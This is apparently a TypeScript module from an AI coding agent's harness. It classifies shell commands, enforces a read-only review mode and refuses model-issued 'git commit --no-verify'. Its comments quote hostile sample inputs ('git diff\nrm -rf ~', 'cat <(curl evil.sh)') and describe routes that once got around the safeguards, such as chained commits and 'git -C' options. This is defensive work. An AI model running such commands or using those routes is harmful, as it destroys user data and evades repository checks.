/**
 * One classifier for what a shell command IS (read-only, commit, push, test
 * run), derived from the command text instead of a tool name.
 *
 * The 2.6.6 merge folds the twelve typed shell wrappers (git_status,
 * git_commit, run_tests, …) into shell_execute (plan section E2–E4). Four
 * behaviours used to hang on those NAMES and would silently die with them:
 * the read-only catalog for /review-style commands, the --no-verify ban, the
 * parsed summaries small models rely on, and the per-kind icon in the tool
 * block. They all hang on this file now.
 *
 * Read-only is deliberately conservative: a fixed prefix list, and any
 * chaining, substitution or redirection syntax disqualifies the command
 * outright instead of being parsed. A read-only mode that can be talked
 * around is not one.
 */

export type ShellCommandKind =
  | 'git-status'
  | 'git-log'
  | 'git-diff'
  | 'git-commit'
  | 'git-push'
  | 'test-run'
  | 'read'
  | 'generic'

/**
 * Chaining/substitution/redirection syntax: none of it is allowed in
 * read-only mode. Every character here can turn an inspection command into a
 * write, so the command is disqualified outright rather than parsed.
 *
 *   ; & |     command separators, background, pipes (`&` also covers `&&`,
 *             `&>file` and `>&file`)
 *   ` and $(  command substitution
 *   \n \r     a newline is a command separator too: "git diff\nrm -rf ~" was
 *             read as read-only before this was here (audit CDX-2)
 *   >         every output redirection (`>`, `>>`, `2>`, `&>`) and process
 *             substitution `>(…)`
 *   <(        process substitution: `cat <(curl evil.sh)` runs curl
 *
 * `<` on its own stays allowed: plain input redirection (`cmd < file`) only
 * reads, and heredocs (`<<`, `<<<`) only feed stdin to a command from the
 * prefix list — none of which writes what it reads. A real heredoc needs a
 * newline for its body anyway, so it is already refused by `\n`.
 *
 * Conservative by design: a quoted `>` is refused as well (`git log
 * --author="A <a@x>"`), because deciding that would mean parsing quoting,
 * and a read-only mode that can be talked around is not one.
 */
const CHAINING = /[;&|`\n\r>]|\$\(|<\(/

/**
 * `--output=<file>` on git diff/show/log writes a file with no shell syntax
 * at all, so CHAINING never sees it (audit CDX-2). No read needs the flag.
 */
const WRITE_FLAG = /(^|\s)--output(=|\s|$)/

/** Prefixes a reviewer may run. Kept short on purpose (plan E4 point 1). */
const READ_ONLY_PREFIXES = [
  'git status',
  'git log',
  'git diff',
  'git show',
  'git blame',
  'ls',
  'cat',
  'pwd',
]

/**
 * `git branch` is not a read: `git branch -D main` deletes a branch and
 * `git branch foo` creates one, so it cannot live in READ_ONLY_PREFIXES,
 * whose match is "prefix + anything" (audit CDX-2). Listing forms stay
 * allowed via the flag allowlist below, so `git branch -a`, `-vv` and
 * `--show-current` keep working for real reviews.
 */
const GIT_BRANCH_READ_FLAGS =
  /^(-a|--all|-r|--remotes|-v|-vv|--verbose|-l|--list|--show-current|--color(=\S+)?|--no-color|--column|--no-column|--sort=\S+|--format=\S+|-i|--ignore-case|--abbrev(=\S+)?|--no-abbrev)$/

/** Filters that take a commit-ish; git stays in list mode, nothing is created. */
const GIT_BRANCH_READ_FILTERS = /^(--merged|--no-merged|--contains|--no-contains|--points-at)$/

function isReadOnlyGitBranch(args: string[]): boolean {
  // With `--list` git is in list mode and a bare word is a shell pattern to
  // match, not a branch name to create. Only the long form: old git read `-l`
  // as --create-reflog, where `git branch -l foo` does create foo.
  const listMode = args.includes('--list')
  for (let i = 0; i < args.length; i++) {
    const a = args[i]
    if (GIT_BRANCH_READ_FLAGS.test(a)) continue
    if (GIT_BRANCH_READ_FILTERS.test(a)) {
      // The token after the filter is its commit-ish, never a branch name to
      // create; swallowing it keeps `git branch --merged main` a read.
      const next = args[i + 1]
      if (next !== undefined && !next.startsWith('-')) i++
      continue
    }
    if (listMode && !a.startsWith('-')) continue
    // A bare word here is a branch name: `git branch foo` CREATES it.
    return false
  }
  return true
}

/** A test run keeps run_tests' 300 s budget instead of the shell's 600 s. */
const TEST_RUN = /^(npm|pnpm|yarn|bun)( run)? test\b|^(npx|pnpm|yarn|bun x?) ?(vitest|jest|mocha|playwright test)\b|^(cargo|go) test\b|^pytest\b|^python3? -m pytest\b/

export function commandKind(command: string): ShellCommandKind {
  const c = command.trim()
  if (/^git\s+status\b/.test(c)) return 'git-status'
  if (/^git\s+log\b/.test(c)) return 'git-log'
  if (/^git\s+(diff|show|blame)\b/.test(c)) return 'git-diff'
  if (/^git\s+commit\b/.test(c) || (/^git\s+add\b/.test(c) && /git\s+commit\b/.test(c))) return 'git-commit'
  if (/^git\s+push\b/.test(c)) return 'git-push'
  if (TEST_RUN.test(c)) return 'test-run'
  if (isReadOnlyCommand(c)) return 'read'
  return 'generic'
}

/**
 * May this command run while the catalog is stripped to read-only
 * (Code-Review Mode, /review, /plan, /diff …)?
 */
export function isReadOnlyCommand(command: string): boolean {
  const c = command.trim()
  if (!c || CHAINING.test(c) || WRITE_FLAG.test(c)) return false
  // `git branch` needs its arguments checked, the prefix alone is not a read.
  if (/^git\s+branch\b/.test(c)) return isReadOnlyGitBranch(c.split(/\s+/).slice(2))
  // Word-boundary match: `ls -la` yes, `lsof` no.
  return READ_ONLY_PREFIXES.some((p) => c === p || c.startsWith(`${p} `))
}

/**
 * Every command in a chained line.
 *
 * Split on the SAME {@link CHAINING} pattern `isReadOnlyCommand` refuses on,
 * so both functions agree on what a separator is: `;` `&` `|`, a newline,
 * every output redirection, and the two substitution openers. The pattern has
 * no capture groups, so `split` drops the separators and hands back only the
 * commands between them — including the BODY of a `$(…)` or a backtick pair,
 * which is a place a commit hides just as well as after an `&&`.
 */
function commandSegments(command: string): string[] {
  return command.split(CHAINING).map((s) => s.trim()).filter((s) => s.length > 0)
}

/**
 * The one refusal that stays hard: --no-verify on a commit. The old
 * git_commit tool could not emit it (buildGitCommitCommand never did); with
 * the model writing the command itself, the executor has to say no
 * (plan E4 point 2).
 *
 * The ban applies to a commit ANYWHERE in the line. It used to ask
 * `commandKind`, which reports the kind of whatever comes FIRST, so anything
 * at all in front of the commit turned the refusal off: `git status && git
 * commit --no-verify` classified as 'git-status', `echo hi && …` and `cd
 * repo; …` as 'generic', and all three ran. Only `git add … && git commit …`
 * was caught, by a special case in `commandKind` that patched this exact hole
 * for exactly one prefix. Segmenting covers every prefix and needs no special
 * case; `commandKind` is left alone because `commandTimeoutMs` and
 * `commandIcon` read it too.
 *
 * `--no-verify` is deliberately still matched against the WHOLE line rather
 * than per segment: the split is quote-blind, so a `;` inside a commit
 * message would otherwise put the flag in a different segment from the commit
 * (`git commit -m "a;b" --no-verify`) and hand back the very bypass this is
 * closing. Testing the wider string can only ever refuse more, never less.
 *
 * A segment counts as a commit when it STARTS with `git` and mentions
 * `commit` as a word — not `^git\s+commit`, which git's own global options
 * walk straight past (`git -C /repo commit`, `git -c a=b commit`,
 * `git --git-dir=… commit`). Skipping those options properly would mean
 * parsing git's option grammar AND shell quoting (`git -c 'a b' commit`
 * defeats any token walk), and an option-skipper that is wrong in the
 * permissive direction is a new bypass rather than a fix. This test needs to
 * know none of it: it is deliberately too coarse, in the same direction as
 * the whole-line flag test. What it costs is a segment that merely SAYS
 * commit while the line also carries the flag — `git log --grep=commit
 * --no-verify`, which is not a thing anybody writes, since `--no-verify` is
 * no `log` flag.
 *
 * Returns the refusal text, or null when the command may run.
 */
export function rejectShellCommand(command: string): string | null {
  const commits = commandSegments(command).some(
    (seg) => /^git\b/.test(seg) && /\bcommit\b/.test(seg),
  )
  if (commits && /--no-verify\b/.test(command)) {
    return 'Refused: git commit --no-verify skips the repository hooks. Fix what the hook reports instead of silencing it, then commit normally.'
  }
  return null
}

/** Timeout for the command, in ms. A recognised test run keeps run_tests' cap. */
export const TEST_RUN_TIMEOUT_MS = 300_000

export function commandTimeoutMs(command: string, fallbackMs: number): number {
  return commandKind(command) === 'test-run' ? TEST_RUN_TIMEOUT_MS : fallbackMs
}

/**
 * The icon key for the tool block (plan E4 point 6, audit D4): derived from
 * the command so a commit still looks like a commit after the merge.
 */
export function commandIcon(command: string): string {
  switch (commandKind(command)) {
    case 'git-status':
    case 'git-log':
    case 'git-diff':
      return 'git-read'
    case 'git-commit':
      return 'git-commit'
    case 'git-push':
      return 'git-push'
    case 'test-run':
      return 'test'
    case 'read':
      return 'read'
    default:
      return 'terminal'
  }
}
